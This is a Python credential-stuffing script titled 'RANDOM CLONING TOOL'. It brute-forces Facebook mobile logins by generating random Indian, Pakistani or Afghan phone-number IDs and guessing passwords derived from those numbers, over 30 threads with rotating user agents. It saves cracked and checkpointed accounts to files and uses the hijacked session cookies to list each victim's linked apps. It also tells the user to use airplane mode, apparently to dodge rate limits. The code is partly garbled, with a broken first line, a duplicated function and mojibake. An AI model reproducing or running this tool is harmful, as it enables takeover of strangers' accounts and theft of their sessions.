mport os



try:

	import requests

except ImportError:

	print('\n [×] requests module not installed!...\n')

	os.system('pip install requests')



try:

	import concurrent.futures

except ImportError:

	print('\n [×] Futures module not installed!...\n')

	os.system('pip install futures')

    

try:

	import bs4

except ImportError:

	print('\n [×] Bs4 module not installed!...\n')

	os.system('pip install bs4')

    

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

import base64

import os,sys,time,json,random,re,string,platform,base64

try:

	import requests

	from concurrent.futures import ThreadPoolExecutor as ThreadPool

	import mechanize

	from requests.exceptions import ConnectionError

except ModuleNotFoundError:

	os.system('pip install mechanize requests futures==2 > /dev/null')

	os.system('python num.py')

  

agents = [

   "Mozilla/5.0 (Linux; Android 12; Mi 11 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.3 Mobile Safari/537.36",
	   "Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-A536N Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.232 Whale/1.0.0.0 Crosswalk/26.90.3.25 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 12; SM-G991U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; arm_64; Android 12; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.7.71.00 SA/3 Mobile Safari/537.36",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E14",
       "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A325F/A325FXXU2AVB3) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Ch",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Amazonb",
       "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 (Eco",
       "Mozilla/5.0 (Linux; Android 11; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; V2109) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QP1A.191005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; HD1905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; LIO-AL00 Build/HUAWEILIO-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.64 HuaweiBrowser/10.0.2.311 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Redmi 3S Build/QD1A.190821.014; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/7.8.3.40913AP",
       "Mozilla/5.0 (Linux; Android 10; Moto G5 Plus (XT1686)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 10; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; CPH1931) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; U; Android 9; zh-tw; ONEPLUS A6010 Build/PKQ1.180716.001) AppleWebKit/533.1 (KHTML, like Gecko) Mobile Safari/533.1",
       "Mozilla/5.0 (Linux; Android 9; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.83 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.1.0; INE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.1.0; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.1.0; Redmi S2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.0.2",
       "Mozilla/5.0 (Linux; Android 6.0.1; Galaxy s7 edge Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 11; Nokia 2.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53",
       "Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36 EdgA/103.0.1264.62",
       "Mozilla/5.0 (Linux; Android 7.0; SM-T813 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Safari/537.36",
       "Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T555) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Safari/537.36",
       "Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T350) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Safari/537.36",
       "Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-C900F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
       "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-T819) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Safari/537.36",
       "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J710F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"


"Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36",] 

logo = """

\t\x1b[1;97m....###....##.......########..##.....##....###...
...##.##...##.......##.....##.##.....##...##.##..
\t\x1b[1;92m..##...##..##.......##.....##.##.....##..##...##.
.##.....##.##.......########..#########.##.....##
\t\x1b[1;97m.#########.##.......##........##.....##.#########
 .##.....##.##.......##........##.....##.##.....##
\t\x1b[1;92m.##.....##.########.##........##.....##.##.....##
\t\x1b[1;97m
\t\x1b[1;92m
\t\x1b[1;97m
\x1b[1;97m --------------------------------------------------

 Author By : HAJI NAWID

\x1b[1;97m Facebook : https://www.facebook.com/RoLixOffiCailAcCount001

\x1b[1;97m Group : Alpha Islamic Team

\x1b[1;97m--------------------------------------------------

\x1b[1;97m This is the campus of Islamic Alpha - Fuck Dark Cyber

\x1b[1;97m--------------------------------------------------

\t\x1b[1;97m[\x1b[1;92mRANDOM CLONING TOOL \x1b[1;97m]

\x1b[1;97m--------------------------------------------------

"""  

loop = 0

oks = []

cps = []



#global functions

def dynamic(text):

	titik = ['.   ','..  ','... ','.... ']

	for o in titik:

		print('\r'+text+o),

		sys.stdout.flush();time.sleep(1)





		

def menu():

	os.system('clear')

	print(logo)

	print(47*"-")

	print('[1] Random crack')

	print(47*"-")

	opt = input('[?] Choose : ')

	if opt =='1':

		random_crack()



def cek_apk(coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r Ã°Å¸Å½Â®  %sYour Active Application Details :'%(H))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r Ã°Å¸Å½Â®  %sYour Expired Application Details :'%(M))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print(f'\r')

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))

   

def random_crack():

	os.system('clear')

	print(logo)

	print(47*"-")

	print('[1] India Random Uid Crack')

	print('[2] PAK and AFG Random Uid Crack')

	print('[0] Back')

	print(47*'-')

	opt = input('[?] Choose : ')

	if opt =='1':

		random_number()

	elif opt =='2':

		random_pak_number()

	elif opt =='0':

		menu()

	else:

		print('\033[1;91mChoose valid option\033[0;97m')



def random_number():

	user=[]

	os.system('clear')

	print(logo)

	print(47*"-")

	print('[+] For Indian Enter Four Digit Code (9934)')

	print(47*'-')

	kode = input('[?] Input Code : ')

	print(47*'-')

	limit = int(input('[?] How many numbers do you want to add : '))

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(6))

		user.append(nmp)

	with ThreadPool(max_workers=30) as yaari:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] Total Ids : \033[1;92m'+tl)

		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")

		for guru in user:

			uid = kode+guru

			mk = uid[:6]

			pwx = [guru]

			pwx = [kode+guru,mk]

			yaari.submit(rcrack,uid,pwx,tl)

	print(47*"-")

	print('[✓] Crack process has been completed')

	print('[?] Ids saved in ok.txt,cp.txt')

	print(47*"-")

	print(' Press Inter To Back Menu')

	menu()

	

    

def rcrack(uid,pwx,tl):

	global loop

	global oks

	global agents

	try:

		for ps in pwx:

			session = requests.Session()

			pro = random.choice(agents)

			free_fb = session.get('https://m.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":uid,

			"pass":ps,

			"login":"Log In"}

			header_freefb = {'authority':'m.facebook.com',

			'method': 'POST',

			'scheme': 'https',

			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',

			'cache-control': 'max-age=0',

			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',

			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',

			'sec-fetch-dest': 'document',

			'sec-fetch-mode': 'navigate',

			'sec-fetch-site': 'none',

			'sec-fetch-user': '?1',

			'upgrade-insecure-requests': '1',

			'user-agent': pro}

			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			#print(iid+'|'+pws+'|'+str(log_cookies))

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[7:22]

				print('\r\033[1;32m[ALPHA-OK] '+cid+' | '+ps)

				cek_apk(coki)

				open('ok.txt', 'a').write(cid+' | '+ps+'\n')

				oks.append(cid)

				break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[24:39]

				print('\r\033[1;31m[ALPHA-CP] '+cid+' | '+ps)

				open('cp.txt', 'a').write(cid+' | '+ps+'\n')

				cps.append(cid)

				break

			else:

				continue

		loop+=1

		sys.stdout.write(f"\r\x1b[1;32m[ A L P H A ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")

		sys.stdout.flush()

	except:

		pass



def random_pak_number():

	user=[]

	os.system('clear')

	print(logo)

	print(47*"-")

	print('[+] For PAK Code(92301) For AFG Code(93780) ETC...')

	print(47*'-')

	kode = input('[?] Input Code : ')

	print(47*'-')

	limit = int(input('[?] How many numbers to add 1000,5000,100000: '))

	for nmbr in range(limit):

		nmp = ''.join(random.choice(string.digits) for _ in range(7))

		user.append(nmp)

	with ThreadPool(max_workers=30) as yaari:

		os.system('clear')

		print(logo)

		tl = str(len(user))

		print('[+] Total Ids : \033[1;92m'+tl)

		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mPak-Afg\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")

		for guru in user:

			uid = kode+guru

			pwx = [guru]

			yaari.submit(rcrack,uid,pwx,tl)

	print(47*"-")

	print('[✓] Crack process has been completed')

	print('[?] Ids saved in ok.txt,cp.txt')

	print(47*"-")

	print(' Press Inter To Back Menu')

	menu()

    

def rcrack(uid,pwx,tl):

	global loop

	global oks

	global agents

	try:

		for ps in pwx:

			session = requests.Session()

			pro = random.choice(agents)

			free_fb = session.get('https://m.facebook.com').text

			log_data = {

				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

			"try_number":"0",

			"unrecognized_tries":"0",

			"email":uid,

			"pass":ps,

			"login":"Log In"}

			header_freefb = {'authority':'m.facebook.com',

			'method': 'POST',

			'scheme': 'https',

			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',

			'cache-control': 'max-age=0',

			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',

			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',

			'sec-fetch-dest': 'document',

			'sec-fetch-mode': 'navigate',

			'sec-fetch-site': 'none',

			'sec-fetch-user': '?1',

			'upgrade-insecure-requests': '1',

			'user-agent': pro}

			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

			log_cookies=session.cookies.get_dict().keys()

			#print(iid+'|'+pws+'|'+str(log_cookies))

			if 'c_user' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[7:22]

				print('\r\033[1;32m[ALPHA-OK] '+cid+' | '+ps)

				cek_apk(coki)

				open('ok.txt', 'a').write(cid+' | '+ps+'\n')

				oks.append(cid)

				break

			elif 'checkpoint' in log_cookies:

				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

				cid = coki[24:39]

				print('\r\033[1;31m[ALPHA-CP] '+cid+' | '+ps)

				open('cp.txt', 'a').write(cid+' | '+ps+'\n')

				cps.append(cid)

				break

			else:

				continue

		loop+=1

		sys.stdout.write(f"\r \x1b[1;32m[ A L P H A ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")

		sys.stdout.flush()

	except:

		pass

menu()
